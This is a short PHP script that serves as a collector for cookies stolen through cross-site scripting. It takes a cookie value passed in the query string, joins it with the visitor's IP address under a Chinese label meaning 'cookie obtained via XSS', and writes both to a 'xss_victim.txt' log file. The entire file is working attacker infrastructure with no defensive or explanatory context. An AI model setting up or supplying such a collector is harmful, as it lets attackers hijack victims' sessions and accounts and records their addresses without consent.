<?php

$victim = 'XXS得到的 cookie:'. $_SERVER['REMOTE_ADDR']. ':' .$_GET['cookie'];
file_put_contents('runtime/xss_victim.txt', $victim);
